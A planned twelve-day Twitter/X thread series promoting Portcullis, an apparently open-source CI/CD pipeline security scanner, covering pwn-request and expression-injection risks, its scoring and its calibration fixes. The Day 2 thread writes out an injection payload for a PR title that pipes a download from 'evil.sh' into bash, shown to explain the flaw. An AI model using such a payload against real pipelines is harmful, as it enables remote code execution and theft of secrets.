# Portcullis — 12-Day Twitter/X Thread Series

Twelve self-contained threads, one per day, that together tell the whole
Portcullis story — problem, tool, proof, philosophy. Each thread stands alone
(so a new follower on Day 9 isn't lost) but they build momentum across the two
weeks.

## How to use this

- **One thread per day**, following the calendar in [`README.md`](README.md). Best windows: **Tue–Thu, 15:00–17:00 UTC** for reach; weekends work for "story" threads (Days 5, 6, 11).
- **Replace** every `<you>` / `[LINK]` with your real handle and repo URL before posting.
- **No `1/12` numbering** in the tweet text — the reply chain numbers itself. Numbering the *series* ("Day 3 of 12") in the first tweet is fine and builds a follow habit.
- **One visual per thread minimum.** The `[IMAGE: …]` markers point at assets in [`images/`](images/), [`../images/`](../images/), or your screenshots. A thread with an image gets ~2× the engagement.
- **Post the blog/repo link as a *reply* to your own thread**, not in the first tweet — external links in the opening tweet suppress reach on X.
- **Engage for 60–90 minutes** after posting. Reply to every comment; the first hour decides the thread's fate.
- Each tweet below is **under 280 characters**. `//` separates tweets in a thread.

---

## Day 1 — Launch thread (pin this for the week)

> **Post with:** blog 2 (build story). **Image:** `../images/report-preview.svg` or `SCREENSHOT: html-report`.

I built an open-source security scanner for CI/CD pipelines — the "build robots" that hold your deploy keys and run strangers' pull-request code.

Then I pointed it at 10 famous repos (Flask, FastAPI, GitHub's own runner).

Here's what happened 🧵 (Day 1 of 12)

//

Your pipeline is the most over-privileged machine you don't watch. It has your secrets, write access, and runs untrusted PR code — several times a day. One careless line turns that into a skeleton key.

//

Portcullis reads your pipeline files (GitHub Actions, GitLab CI, Jenkins) and flags the mistakes behind real supply-chain compromises. Statically. Offline. Never runs your pipeline.

[IMAGE: report-preview]

//

The result that matters: 66 real pipeline files, ~1.4 seconds, zero crashes, zero secret leaks. Well-maintained repos scored 95–100. Ones with real debt scored low — with findings you can actually act on.

//

And the real data caught TWO bugs in my *own* scoring — it was over-reacting to harmless things. Fixing that is the whole story. I'll unpack it over the next 12 days.

Repo + write-up in the reply 👇 Follow along.

// (reply) 🔗 [LINK to repo] — Apache-2.0, install with `pip install portcullis-scanner`.

---

## Day 2 — The one-line problem

> **Image:** code screenshot of the unsafe vs safe `env:` snippet.

Most CI/CD hacks aren't exotic. They're one line of YAML a reviewer skimmed past.

Here's the most common one 🧵 (Day 2 of 12)

//

This looks harmless:

`run: echo "PR title: ${{ github.event.pull_request.title }}"`

It isn't. That title is attacker-controlled, and `${{ }}` is expanded BEFORE the shell parses the line. So the attacker isn't supplying data — they're supplying commands.

//

Name your PR:
`"; curl evil.sh | bash; echo "`

…and a harmless `echo` just became remote code execution on your build server. With your secrets in the environment.

//

The fix is boring and total: route the value through an environment variable so the shell sees it as DATA, never as code.

`env:{TITLE: ${{...title}}}` then `run: echo "$TITLE"`

//

Trusted values (`github.sha`) → fine to interpolate. Attacker values (`.title`, `.body`, `.head_ref`) → never. Portcullis flags exactly this, and tells you when the value is actually reachable.

🔗 [LINK] (reply)

---

## Day 3 — The pwn-request explained

> **Post with:** blog 1. **Image:** `images/pwn-request-flow.svg`.

You can lose every secret in your repo without a single commit being merged. It's called a "pwn-request." 🧵 (Day 3 of 12)

//

GitHub's `pull_request` trigger runs a fork's code but WITHHOLDS your secrets. Safe by design.

So maintainers who need secrets reach for `pull_request_target` — which provides them. That's where it goes wrong.

//

`pull_request_target` is meant to run YOUR code. The moment you also check out the PR's code:

`with: ref: ${{ github.event.pull_request.head.sha }}`

…you're running the attacker's code with your secrets. Merely opening the PR is enough.

[IMAGE: pwn-request-flow]

//

Analogy: it's fine for a bank teller to have vault keys. It's fine to help walk-in customers. It's a robbery when a walk-in gets to WRITE the teller's instructions while the vault is open.

//

Portcullis rates this CRITICAL/P0 — and because the job is attacker-reachable, every OTHER finding on it escalates too. Context makes the danger, and the scoring reflects it.

Full breakdown 🔗 [LINK] (reply)

---

## Day 4 — Expression injection, deeper

> **Image:** `SCREENSHOT: terminal-scan` showing R2 findings.

Yesterday: attacker PR code. Today: attacker *text*. Both end in code execution, and the second is sneakier. 🧵 (Day 4 of 12)

//

Every field an outsider controls is a potential payload: PR titles, issue bodies, comment text, branch names, commit messages. Anywhere one lands in a `run:` line via `${{ }}`, you have injection.

//

GitHub isn't alone. GitLab has attacker-controlled MR variables (`$CI_MERGE_REQUEST_TITLE`). Jenkins has change-request env (`$CHANGE_TITLE`) interpolated into `sh` steps. Same bug, three ecosystems.

//

Portcullis carries a curated list of untrusted sources per platform and a lightweight taint check: does that value land in a shell context *directly*, or safely via `env:`? Only the dangerous form is flagged.

[IMAGE: terminal-scan]

//

And it's honest about uncertainty — static analysis can't always prove reachability, so findings carry HIGH/MEDIUM/LOW confidence. Low-confidence ones surface without blocking your merge.

🔗 [LINK] (reply)

---

## Day 5 — I scanned 10 famous repos (results)

> **Post with:** the r/netsec submission. **Image:** the score table (screenshot the blog-2 table).

I ran my scanner over 66 real pipeline files from 10 well-known projects. No fixtures. Here's the honest scoreboard 🧵 (Day 5 of 12)

//

The score tracked reality:
• gitlab-runner: 100
• flask / click: 95
• requests: 85
• spring-petclinic: 27
• actions/runner: 0

Every low score was backed by findings you could act on — not vibes.

//

Robustness held: matrix builds, reusable workflows, YAML anchors, multi-doc files, even a deliberately-broken config. 66 files, ~1.4s, zero crashes. Two malformed files degraded to low findings instead of exploding.

//

And zero secret values leaked into any of the 4 output formats — I check that automatically, on the real data, every run. A security tool that leaks secrets in its own report is a punchline.

[IMAGE: score-table]

//

But the best part was being wrong. The real data caught 2 calibration bugs in my own tool. That's tomorrow.

🔗 [LINK] (reply)

---

## Day 6 — Being wrong (the calibration fixes)

> **Image:** the before/after corroboration Mermaid diagram (screenshot from blog 2).

A security scanner that cries wolf gets switched off. My real-world test caught mine crying wolf twice. Fixing it was the most valuable part. 🧵 (Day 6 of 12)

//

Bug 1: GitHub's own runner repo had 3 Docker actions pinned to tags in a MANUALLY-triggered job — ranked P0 (block the merge!). That's absurd. P0 must mean "an attacker can reach this." A manual job isn't that.

//

The fix encodes the principle: corroboration between findings can only reach P0 when the job is actually attacker-reachable. On a trusted trigger it floors at P1 — "fix soon," not "stop everything." False P0s: 6 → 0.

[IMAGE: before-after-diagram]

//

Bug 2: my secret detector flagged high-entropy strings that weren't secrets — `linux/amd64,linux/arm64`, artifact names, a project URL. Correctly low-confidence, but noise. A denylist + rejecting path/list-shaped values: FPs 9 → 0.

//

Net effect across the dataset: false criticals cut by two-thirds, zero genuine detections lost. Real data > your own fixtures, every time.

🔗 [LINK] (reply)

---

## Day 7 — The respectful competitor comparison

> **Image:** the platform-coverage Mermaid diagram.

I benchmarked my scanner against zizmor — a mature, genuinely great GitHub Actions scanner. I'm not here to dunk. Here's the honest result. 🧵 (Day 7 of 12)

//

First: we AGREE on substance. On the repos zizmor flagged, Portcullis flagged the same real issues — unpinned actions, loose permissions. Independent corroboration is the best evidence your findings are real.

//

We differ on philosophy. zizmor is lint-style: every unpinned action is an error → 230 findings (66 "high") on one repo. Portcullis is priority-first → 81 findings, 0 P0. Neither is wrong. A 2026 paper on 9 scanners says: combine them.

//

But one difference isn't philosophy — it's coverage. Point zizmor at a GitLab or Jenkins file and it exits: "no audit was performed." It's GitHub-only.

[IMAGE: platform-coverage]

//

Portcullis read every GitLab and Jenkins file through the SAME rules, because all three platforms normalize to one shared model. For a team on mixed CI, that's the whole ballgame.

🔗 [LINK] (reply)

---

## Day 8 — Context is everything (the core insight)

> **Post with:** blog 3. **Image:** `../images/architecture.svg`.

Two jobs, identical line: `curl install.sh | bash`. One is a shrug. One should block your merge. The difference is the entire product. 🧵 (Day 8 of 12)

//

A dumb scanner scores by the rule: both get the same severity. So you either over-react to the safe one or under-react to the dangerous one. Either way you stop trusting the tool.

//

The smart version asks one question first: can an attacker reach this job? Portcullis computes that for every job at parse time — from the triggers — and stores it on a shared model.

[IMAGE: architecture]

//

Then one rule carries the judgment: a finding in an attacker-reachable job is escalated one severity level. The same mistake IS more dangerous where untrusted input can reach it.

//

Result: injection on a `push` job = P1 (real, not externally reachable). The identical injection on `pull_request_target` = P0 (attacker input hits a shell with secrets). Same rule. Different context. Correct.

Deep dive 🔗 [LINK] (reply)

---

## Day 9 — The risk score

> **Image:** `SCREENSHOT: html-report` score band, or the score formula.

"Security score: 73/100" is meaningless if you can't see the math. Here's a pipeline score you can actually audit. 🧵 (Day 9 of 12)

//

Portcullis's formula, printed on every report:

`score = max(0, 100 − 30·P0 − 15·P1 − 5·P2 − 1·P3)`

No black box. No ML vibes. You can recompute it by hand from the findings.

//

Priorities themselves are deterministic: severity → priority, then a corroboration bump (two problems in one job is worse than one), then a confidence floor (low-confidence never blocks). Every step is a rule, not a mood.

[IMAGE: html-report-score]

//

The entire (findings → priority) mapping is an executable truth table in the test suite. If the scoring ever drifts, a test breaks. Auditability isn't a feature bolted on — it's the design.

//

Why care? Because a score you can explain is a score your team will trust — and a security tool is only worth anything if people leave it turned on.

🔗 [LINK] (reply)

---

## Day 10 — Multi-platform: one model, three CI systems

> **Image:** `../images/architecture.svg` (the normalized-model panel).

Writing a security rule three times — once for GitHub, once for GitLab, once for Jenkins — is how rules drift and bugs hide. Portcullis writes each rule once. 🧵 (Day 10 of 12)

//

The trick: every parser normalizes its platform into ONE shared model — triggers, permissions, jobs, steps, with file:line intact. Rules operate on that model, never on raw YAML.

[IMAGE: architecture]

//

So the pwn-request rule, the injection rule, the pinning rule — each is written once and runs on all three platforms. Adding CircleCI or Azure Pipelines later is a parser, not a rule rewrite.

//

Jenkins is the honest hard case: Groovy can't be parsed safely without running it, which Portcullis never does. So the Jenkins parser is best-effort and structurally caps its findings at MEDIUM confidence. Overclaiming there would be dishonest.

//

GitHub-only scanners can't do this at all — they exit on a `.gitlab-ci.yml`. If your org runs mixed CI, one tool with one model beats three tools with three mental models.

🔗 [LINK] (reply)

---

## Day 11 — Responsible by design (the inert-fixture law)

> **Image:** a snippet of a fixture showing the `echo` payload + "INERT-BUT-VULNERABLE" header.

How do you ship a repo full of "vulnerable pipelines" for testing without shipping actual exploits? You make it a law and enforce it with a test. 🧵 (Day 11 of 12)

//

Portcullis's test fixtures are genuinely misconfigured — real pwn-request triggers, real injection sinks. But every payload is a harmless `echo`. Every URL is `example.com`. Every "secret" is obviously fake.

//

Vulnerable-looking, harmless-acting. That's the inert-fixture law. And it's not a promise — it's an automated guard (`test_inertness.py`) that FAILS the build if any fixture ever contains a real exploit shape, a live URL, or a real-looking credential.

[IMAGE: inert-fixture]

//

Same discipline everywhere: the tool never executes your pipeline, never touches the network, redacts any secret it detects in every output, and its own CI is SHA-pinned and least-privilege — so Portcullis passes its own scan at 100/100.

//

A defensive tool that isn't obsessive about its own safety has no business gating your pipelines. This is table stakes, and it's all enforced in tests.

🔗 [LINK] (reply)

---

## Day 12 — Lessons + recap (double post: this + a short CTA thread)

> **Image:** `../images/terminal.svg`. **Also today:** post the repo to Show HN / Lobste.rs (or hold HN to next Tue).

12 days ago I said building a pipeline security scanner taught me more than I expected. Here's everything, in one thread. 🧵 (Day 12 of 12)

//

1. Your CI pipeline is production. It has production's keys and more attack surface. Treat it that way.

//

2. The bugs are boring: untrusted PR code + secrets in one job (pwn-request), and attacker text in a shell line (injection). Both are one careless line.

//

3. Severity isn't a property of a pattern — it's a property of a pattern IN A CONTEXT. Compute attacker-reachability, escalate accordingly. That's the whole game.

//

4. Test on data you didn't write. Real repos caught 2 bugs my fixtures never would have. False positives are a product bug, not a footnote.

//

5. Respect prior art (zizmor, poutine, ARGUS), publish your limitations, make your scoring auditable. In security, honesty IS the marketing.

[IMAGE: terminal]

//

Portcullis is open-source (Apache-2.0), scans GitHub Actions + GitLab CI + Jenkins, runs offline, and gates your merges. If you run CI, give it a spin — and tell me where it's wrong.

🔗 [LINK] — thanks for following along 🙏 (reply)

---

### Second short thread for Day 12 (the CTA / "try it")

Portcullis v0.1.0 is out. Open-source CI/CD pipeline security scanner. 🏰

`pip install portcullis-scanner`
`portcullis scan . --fail-on P0`

• GitHub Actions + GitLab CI + Jenkins
• Offline, deterministic, never runs your pipeline
• JSON / HTML / SARIF / PR-comment output

🔗 [LINK] — stars & issues welcome.
